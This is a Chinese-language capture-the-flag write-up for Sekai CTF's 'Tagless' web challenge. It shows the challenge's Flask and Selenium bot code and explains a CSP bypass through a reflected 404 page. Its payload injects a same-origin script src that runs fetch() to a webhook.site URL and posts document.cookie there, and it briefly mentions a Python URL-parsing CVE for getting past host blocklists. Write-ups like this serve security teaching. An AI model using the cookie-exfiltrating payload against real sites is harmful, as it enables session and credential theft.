---
title: Sekai CTF Writeup-Tagless
tags:
  - Write-ups
  - CTF
  - Web Security
  - XSS
createTime: 2024/09/06 12:11:48
permalink: /article/h1j75q4w/
---
## Tagless
`App.py`
```python
from flask import Flask, render_template, make_response,request
from bot import *
from urllib.parse import urlparse

app = Flask(__name__, static_folder='static')

@app.after_request
def add_security_headers(resp):
    resp.headers['Content-Security-Policy'] = "script-src 'self'; style-src 'self' https://fonts.googleapis.com https://unpkg.com 'unsafe-inline'; font-src https://fonts.gstatic.com;"# [!code highlight]
    return resp

@app.route('/')
def index():
    return render_template('index.html')

@app.route("/report", methods=["POST"])
def report():
    bot = Bot()
    url = request.form.get('url')
    if url:
        try:
            parsed_url = urlparse(url)
        except Exception:
            return {"error": "Invalid URL."}, 400
        if parsed_url.scheme not in ["http", "https"]:
            return {"error": "Invalid scheme."}, 400
        if parsed_url.hostname not in ["127.0.0.1", "localhost"]:
            return {"error": "Invalid host."}, 401
        
        bot.visit(url)
        bot.close()
        return {"visited":url}, 200
    else:
        return {"error":"URL parameter is missing!"}, 400
    
@app.errorhandler(404)
def page_not_found(error):
    path = request.path
    return f"{path} not found"# [!code highlight]



if __name__ == '__main__':
    app.run(debug=True)

```
`bot.py`
```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time 

class Bot:
    def __init__(self):
        chrome_options = Options()
        chrome_options.add_argument("--headless")  
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-extensions") 
        chrome_options.add_argument("--window-size=1920x1080") 
        
        self.driver = webdriver.Chrome(options=chrome_options)

    def visit(self, url):
        self.driver.get("http://127.0.0.1:5000/")
        
        self.driver.add_cookie({
            "name": "flag", 
            "value": "SEKAI{dummy}", 
            "httponly": False  
        }) 
        
        self.driver.get(url)
        time.sleep(1)
        self.driver.refresh()
        print(f"Visited {url}")

    def close(self):
        self.driver.quit()
```
一眼xss绕过csp.

根路由返回静态的index.html，看了一眼没活，关注一下这个默认的报错handler，发现可以注入HTML标签,注入script标签没有效果，因为它不接受行间注入JavaScript。

意外地发现在script的csp检查中，可以注入`src`属性来绕过csp检查。script标签会先解析外部的src属性，之后根据src属性和csp决定继续调用script内容。

然而解析src属性的过程中也是可以注入内联js的，并且不会受到csp的影响.

payload:
```
POST: 
https://tagless-j2rkd3qii9ny.chals.sekai.team/report
URL:
http://127.0.0.1:5000/<html><head><script src='/1/;fetch("https://webhook.site/325d8fc1-9998-4641-81df-05368b822eae", {method:"POST", body:document.cookie});//'></script></head></html>
```
之后从WebHook上拿到外带的flag即可.

另外在做题过程中发现的一些有意思的点：

`CVE-2023-24329`：Python URL解析函数漏洞，可以绕过黑名单